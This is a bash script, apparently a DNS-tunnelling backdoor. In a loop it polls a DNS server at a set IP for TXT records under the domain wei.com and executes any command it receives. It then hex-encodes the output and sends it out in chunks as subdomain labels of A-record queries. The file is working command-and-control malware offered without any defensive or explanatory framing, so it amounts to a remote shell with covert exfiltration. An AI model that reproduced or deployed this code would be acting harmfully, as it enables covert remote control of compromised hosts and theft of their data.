#!/bin/bash
ip=${1-"192.168.59.132"}
url="wei.com";
t_data=1
t_task=3

dnsexec(){
    #echo "get-cmd:$*"
    result=`$*`
    hex_result=`echo ${result}| xxd -p| sed ":a;N;s/\\n//g;ta"`
    #echo "hex_result: $hex_result"
    hex_length=${#hex_result}   #wc -L
    split_len=50
    chunks_num=$(( ${hex_length} / ${split_len} ))
    chunks_remainder=$(( ${hex_length} % ${split_len} ))
    if [ "$chunks_remainder" -ne "0" ];then
        let chunks_num=chunks_num+1
    fi
    i=0
    while [ "${i}" -lt "${chunks_num}" ]
    do
        sleep ${t_data}
        random_str=`head /dev/urandom |md5sum |cut -c 1-9`
        let x=1+${i}*${split_len}
        let y=${split_len}+${i}*${split_len}
        A_req=${random_str}."CMD"$i.`echo ${hex_result}|cut -c ${x}-${y}`.${url}
        echo $A_req
        nslookup -querytype=A ${A_req} $ip 2>&1 > /dev/null
        let i=i+1
    done

    random_str=`head /dev/urandom |md5sum |cut -c 1-9`
    A_req=${random_str}."END".${url}
    echo $A_req
    nslookup -querytype=A ${A_req} $ip 2>&1 > /dev/null
}

#dnsexec ls $*

while [ "1" = "1" ]
do
    sleep ${t_task}
    random_str=`head /dev/urandom |md5sum |cut -c 1-9`
    TXT_req=${random_str}.${url}
    TXT_rcv=`nslookup -querytype=TXT ${TXT_req} $ip`
    TXT_cmd=`echo ${TXT_rcv}|grep ${url}|awk -F"text = " '{print $2}'`
	TXT_cmd=${TXT_cmd%\"}
	TXT_cmd=${TXT_cmd#*\"}
    if [[ "${TXT_rcv}" =~ "NoCMD" ]];then
        continue;
    elif [[ "${TXT_rcv}" =~ "exit" ]];then
        exit;
    else
        dnsexec ${TXT_cmd}
    fi
done
